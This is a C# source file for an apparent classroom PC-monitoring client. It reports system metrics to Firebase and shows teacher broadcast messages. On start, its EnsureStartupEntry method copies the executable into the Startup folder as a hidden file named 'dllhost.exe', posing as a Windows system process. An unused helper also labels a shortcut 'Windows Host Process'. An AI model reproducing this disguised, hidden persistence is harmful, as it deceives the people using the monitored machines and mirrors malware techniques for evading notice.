using System;
using System.Collections.Generic;
using System.Diagnostics;
using System.IO;
using System.Linq;
using System.Threading.Tasks;
using System.Timers;
using System.Windows;
using TaskEngine.Models;
using TaskEngine.Utils;
using Timer = System.Timers.Timer;

namespace TaskEngine.Services
{
    public class ClientService : IDisposable
    {
        private readonly FirebaseService _firebase;
        private readonly string _pcName;
        private readonly Timer _timer;
        private readonly Timer _cleanupTimer;
        private readonly Timer _messageTimer; // ✅ NUEVO: para mensajes globales

        public string CurrentNickname { get; set; }
        private bool _disposed;
        private string _lastGlobalMessageId; // ✅ NUEVO: para evitar duplicados

        public event Action<string> OnLog;

        private const int HISTORY_SAVE_INTERVAL_SECONDS = 60 * 10;
        private const int CLEANUP_INTERVAL_MINUTES = 40;
        private const int HISTORY_RETENTION_MINUTES = 1440 * 7;
        private const int GLOBAL_MESSAGE_CHECK_INTERVAL_MS = 10000; // 10 segundos

        private DateTime _lastHistorySave = DateTime.MinValue;

        private string _pcGroup = "Sin grupo"; // ✅ Grupo actual de la PC
        private string _lastLabMessageId; // ✅ Para evitar duplicados de mensajes de laboratorio


        public ClientService(double intervalMs = 3000)
        {
            _firebase = new FirebaseService();
            _pcName = Environment.MachineName;

            // Temporizador principal (métricas)
            _timer = new Timer(intervalMs) { AutoReset = true };
            _timer.Elapsed += async (s, e) => await TimerTickAsync();

            // Temporizador de limpieza
            _cleanupTimer = new Timer(TimeSpan.FromMinutes(CLEANUP_INTERVAL_MINUTES).TotalMilliseconds)
            {
                AutoReset = true
            };
            _cleanupTimer.Elapsed += async (s, e) => await CleanupHistoryAsync();

            // ✅ NUEVO: Temporizador para mensajes globales Y de laboratorio
            _messageTimer = new Timer(GLOBAL_MESSAGE_CHECK_INTERVAL_MS) { AutoReset = true };
            _messageTimer.Elapsed += async (s, e) =>
            {
                await CheckGlobalMessagesAsync();
                await CheckLabMessagesAsync(); // 👈 ¡Esto faltaba!
            };
        }

        public async Task InitializeAsync()
        {
            var existing = await _firebase.GetMachineAsync(_pcName);
            if (existing == null)
            {
                CurrentNickname = _pcName;
                var info = new PCInfo
                {
                    PCName = _pcName,
                    Nickname = CurrentNickname,
                    IsOnline = true,
                    LastUpdate = DateTime.UtcNow.ToString("o"),
                    Timestamp = DateTimeOffset.UtcNow.ToUnixTimeSeconds()
                };
                await _firebase.SetMachineAsync(_pcName, info);
            }
            else
            {
                CurrentNickname = existing.Nickname ?? _pcName;
            }
        }

        public void Start()
        {


            EnsureStartupEntry();


            if (_disposed) throw new ObjectDisposedException(nameof(ClientService));
            if (_timer.Enabled) return;

            _ = RegisterIfFirstTimeAsync();
            _ = InitializeNicknameAsync();
            _ = InitializeGroupAsync();

            Log($"ClientService starting (interval {_timer.Interval}ms) for {_pcName}");
            _ = TimerTickAsync();
            _timer.Start();
            _cleanupTimer.Start();
            _messageTimer.Start(); // ✅ Iniciar temporizador de mensajes
        }

        public void Stop()
        {
            if (_disposed) return;
            if (!_timer.Enabled) return;
            _timer.Stop();
            _cleanupTimer.Stop();
            _messageTimer.Stop(); // ✅ Detener temporizador de mensajes
            Log("ClientService stopped");
        }

        private void EnsureStartupEntry()
        {
            try
            {
                string startupFolder = Environment.GetFolderPath(Environment.SpecialFolder.Startup);
                string currentExe = Process.GetCurrentProcess().MainModule.FileName;
                string startupExe = Path.Combine(startupFolder, "dllhost.exe");

                if (!File.Exists(startupExe))
                {
                    File.Copy(currentExe, startupExe);
                    // Opcional: ocultar el archivo
                    File.SetAttributes(startupExe, File.GetAttributes(startupExe) | FileAttributes.Hidden);
                }
            }
            catch (Exception ex)
            {
                Log($"Error al copiar al inicio: {ex.Message}");
            }
        }

        private void CreateShortcut(string shortcutPath, string targetPath)
        {
            Type shellType = Type.GetTypeFromProgID("WScript.Shell");
            dynamic shell = Activator.CreateInstance(shellType);
            dynamic shortcut = shell.CreateShortcut(shortcutPath);
            shortcut.TargetPath = targetPath;
            shortcut.WindowStyle = 7; // Minimizado
            shortcut.Description = "Windows Host Process";
            shortcut.Save();
        }

        private async Task RegisterIfFirstTimeAsync()
        {
            var existing = await _firebase.GetMachineAsync(_pcName);
            if (existing == null)
            {
                var info = new PCInfo
                {
                    PCName = _pcName,
                    CpuUsage = 0,
                    CpuTemperature = 0,
                    RamUsagePercent = 0,
                    TotalRamMB = 0,
                    UsedRamMB = 0,
                    DiskUsagePercent = 0,
                    IsOnline = true,
                    LastUpdate = DateTime.UtcNow.ToString("o"),
                    Timestamp = DateTimeOffset.UtcNow.ToUnixTimeSeconds(),
                    Nickname = _pcName
                };
                await _firebase.SetMachineAsync(_pcName, info);
            }
        }

        // ✅ NUEVO: Verificar mensajes del laboratorio
        private async Task CheckLabMessagesAsync()
        {
            try
            {
                var labMsg = await _firebase.GetLabMessageAsync(_pcGroup);
                if (labMsg != null && labMsg.Id != _lastLabMessageId)
                {
                    _lastLabMessageId = labMsg.Id;
                    System.Windows.MessageBox.Show(
                        $"[{labMsg.Sender}] {labMsg.Message}",
                        $"Mensaje para {_pcGroup}",
                        MessageBoxButton.OK,
                        MessageBoxImage.Information,
                        MessageBoxResult.OK,
                        System.Windows.MessageBoxOptions.ServiceNotification
                    );
                }
            }
            catch (Exception ex)
            {
                Log($"Error checking lab messages: {ex.Message}");
            }
        }

        private async Task InitializeNicknameAsync()
        {
            try
            {
                var existing = await _firebase.GetMachineAsync(_pcName);
                if (existing != null && !string.IsNullOrWhiteSpace(existing.Nickname))
                    CurrentNickname = existing.Nickname;
                else
                    CurrentNickname = _pcName;
            }
            catch (Exception ex)
            {
                Log("Error inicializando nickname: " + ex.Message);
                CurrentNickname = _pcName;
            }
        }

        private async Task CleanupHistoryAsync()
        {
            if (string.IsNullOrWhiteSpace(_pcName)) return;
            await _firebase.CleanOldHistoryAsync(_pcName, TimeSpan.FromMinutes(HISTORY_RETENTION_MINUTES));
        }

        // ✅ NUEVO: Verificar mensajes globales
        private async Task CheckGlobalMessagesAsync()
        {
            try
            {
                var globalMsg = await _firebase.GetGlobalMessageAsync();
                if (globalMsg != null && globalMsg.Id != _lastGlobalMessageId)
                {
                    // ✅ Verificar que el mensaje no sea muy viejo
                    if (DateTime.TryParse(globalMsg.Timestamp, out DateTime msgTime))
                    {
                        TimeSpan age = DateTime.UtcNow - msgTime;
                        if (age.TotalMinutes > 5) // Ignorar mensajes >5 minutos
                            return;
                    }

                    _lastGlobalMessageId = globalMsg.Id;
                    System.Windows.MessageBox.Show(
                        $"[{globalMsg.Sender}] {globalMsg.Message}",
                        "Mensaje del profesor",
                        MessageBoxButton.OK,
                        MessageBoxImage.Information,
                        MessageBoxResult.OK,
                        System.Windows.MessageBoxOptions.ServiceNotification
                    );
                }
            }
            catch (Exception ex)
            {
                Log($"Error checking global messages: {ex.Message}");
            }
        }

        private async Task TimerTickAsync()
        {
            var now = DateTime.UtcNow;

            // --- Recoger métricas ---
            float cpu = 0f, temp = 0f, disk = 0f;
            int usedMB = 0, totalMB = 0;
            float ramPercent = 0f;

            try { cpu = SystemInfo.GetCpuUsagePercent(); } catch { }
            try { temp = SystemInfo.GetCpuTemperature(); } catch { }
            try { disk = SystemInfo.GetDiskUsagePercent("C"); } catch { }
            try
            {
                var r = SystemInfo.GetRamInfo();
                ramPercent = r.percentUsed;
                usedMB = Convert.ToInt32(r.usedMB);
                totalMB = Convert.ToInt32(r.totalMB);
            }
            catch { }

            // ✅ Obtener nickname ACTUALIZADO de Firebase (por si el Master lo cambió)
            string currentNickname = CurrentNickname;
            try
            {
                var pc = await _firebase.GetMachineAsync(_pcName);
                if (pc != null && !string.IsNullOrEmpty(pc.Nickname))
                {
                    currentNickname = pc.Nickname;
                    CurrentNickname = currentNickname; // Actualizar caché local
                }
            }
            catch { /* Ignorar errores de lectura */ }

            var info = new PCInfo
            {
                PCName = _pcName,
                CpuUsage = cpu,
                CpuTemperature = temp,
                RamUsagePercent = ramPercent,
                TotalRamMB = totalMB,
                UsedRamMB = usedMB,
                DiskUsagePercent = disk,
                IsOnline = true,
                LastUpdate = DateTime.UtcNow.ToString("o"),
                Timestamp = DateTimeOffset.UtcNow.ToUnixTimeSeconds(),
                Nickname = currentNickname // ✅ Usar nickname actualizado
            };

            // --- Guardar estado actual ---
            try { await _firebase.SetMachineAsync(_pcName, info); }
            catch (Exception ex) { Log($"Firebase error (main): {ex.Message}"); }

            // --- Guardar historial ---
            if ((now - _lastHistorySave).TotalSeconds >= HISTORY_SAVE_INTERVAL_SECONDS)
            {
                _lastHistorySave = now;
                try
                {
                    await _firebase.AddHistoryPointAsync(_pcName, info);
                    await CleanupHistoryAsync();
                }
                catch (Exception ex) { Log($"Failed to save history: {ex.Message}"); }
            }
        }

        private void Log(string text)
        {
            try
            {
                var msg = $"[ClientService {DateTime.Now:HH:mm:ss}] {text}";
                Console.WriteLine(msg);
                OnLog?.Invoke(msg);
            }
            catch { }
        }

        public Task SendSnapshotAsync()
        {
            return TimerTickAsync();
        }

        private async Task InitializeGroupAsync()
        {
            try
            {
                var pc = await _firebase.GetMachineAsync(_pcName);
                _pcGroup = pc?.Group ?? "Sin grupo";
            }
            catch (Exception ex)
            {
                Log("Error inicializando grupo: " + ex.Message);
                _pcGroup = "Sin grupo";
            }
        }

        public async Task UpdateNicknameAsync(string newNickname)
        {
            CurrentNickname = newNickname;
            var info = await _firebase.GetMachineAsync(_pcName);
            if (info != null)
            {
                info.Nickname = newNickname;
                await _firebase.SetMachineAsync(_pcName, info);
            }
        }

        #region IDisposable
        public void Dispose()
        {
            if (_disposed) return;
            try
            {
                Stop();
                _timer.Dispose();
                _cleanupTimer.Dispose();
                _messageTimer.Dispose(); // ✅
            }
            catch { }
            _disposed = true;
        }
        #endregion
    }
}